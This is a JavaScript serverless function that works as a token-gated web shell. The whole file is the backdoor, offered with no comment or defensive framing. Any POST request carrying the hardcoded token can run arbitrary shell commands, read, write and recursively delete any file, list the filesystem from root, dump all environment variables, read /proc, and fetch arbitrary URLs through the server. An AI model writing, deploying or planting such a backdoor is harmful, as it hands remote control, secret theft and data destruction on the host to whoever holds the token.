const TOKEN = "nfbb-tk-5e385c2b00f28f34fde07fbdf8054160";
const json = (code, body) => new Response(JSON.stringify(body, null, 1), { status: code, headers: { "content-type": "application/json" } });

export default async (req) => {
  if (req.method !== "POST") return json(405, { err: "POST only" });
  let m;
  try { m = await req.json(); } catch { return json(400, { err: "bad json" }); }
  if (m.token !== TOKEN) return json(401, { err: "no" });
  const fs = await import("node:fs/promises");
  const fss = await import("node:fs");
  const cp = await import("node:child_process");
  const dns = await import("node:dns/promises");
  const path = await import("node:path");
  try {
    switch (m.op) {
      case "id": return json(200, { uid: fss.getuid?.() ?? process.getuid(), gid: process.getgid(), node: process.version, pid: process.pid, ppid: process.ppid, host: (await import("node:os")).hostname() });
      case "exec": {
        const { promisify } = await import("node:util");
        const r = await promisify(cp.exec)(m.cmd, { timeout: m.timeout || 20000, maxBuffer: 16 * 1024 * 1024, cwd: m.cwd || "/tmp" });
        return json(200, { stdout: r.stdout, stderr: r.stderr });
      }
      case "read": {
        if (m.offset != null || m.len != null) {
          const fh = await fs.open(m.path, "r");
          const buf = Buffer.alloc(m.len || 4096);
          const { bytesRead } = await fh.read(buf, 0, buf.length, m.offset || 0);
          await fh.close();
          return json(200, { bytes: bytesRead, b64: buf.subarray(0, bytesRead).toString("base64") });
        }
        return json(200, { data: (await fs.readFile(m.path)).toString("utf8", 0, m.max || 262144) });
      }
      case "write": await fs.writeFile(m.path, m.data ?? "", { mode: 0o644 }); return json(200, { ok: true });
      case "append": await fs.appendFile(m.path, m.data ?? ""); return json(200, { ok: true });
      case "mkdir": await fs.mkdir(m.path, { recursive: true }); return json(200, { ok: true });
      case "rm": await fs.rm(m.path, { recursive: !!m.recursive, force: true }); return json(200, { ok: true });
      case "stat": { const s = await fs.stat(m.path); return json(200, { size: s.size, mode: s.mode.toString(8), uid: s.uid, gid: s.gid, mtime: s.mtime }); }
      case "walk": {
        const out = [];
        const walk = async (p, d) => {
          if (d > (m.depth || 3)) return;
          let es; try { es = await fs.readdir(p, { withFileTypes: true }); } catch { return; }
          for (const e of es) {
            const fp = path.join(p, e.name);
            out.push(fp);
            if (e.isDirectory()) await walk(fp, d + 1);
          }
        };
        await walk(m.path || "/", 0);
        return json(200, { files: out.slice(0, m.limit || 2000) });
      }
      case "env": return json(200, { keys: Object.keys(process.env), env: m.full ? process.env : undefined });
      case "proc": return json(200, { data: (await fs.readFile("/proc/" + (m.pid || "self") + "/" + m.file)).toString() });
      case "dns": return json(200, { addrs: await dns.resolve(m.host, m.rr || "A").catch(e => [{ err: e.code }]) });
      case "fetch": {
        const r = await fetch(m.url, { method: m.method || "GET", headers: m.headers || {}, body: m.body, redirect: m.redirect || "manual" });
        const t = await r.text();
        return json(200, { status: r.status, headers: Object.fromEntries(r.headers), body: t.slice(0, m.max || 65536) });
      }
      case "b64d": return json(200, { data: Buffer.from(m.data, "base64").toString("utf8") });
      case "b64e": return json(200, { data: Buffer.from(m.data, "utf8").toString("base64") });
      default: return json(400, { err: "op?" });
    }
  } catch (e) { return json(500, { err: String(e && e.message || e) }); }
};
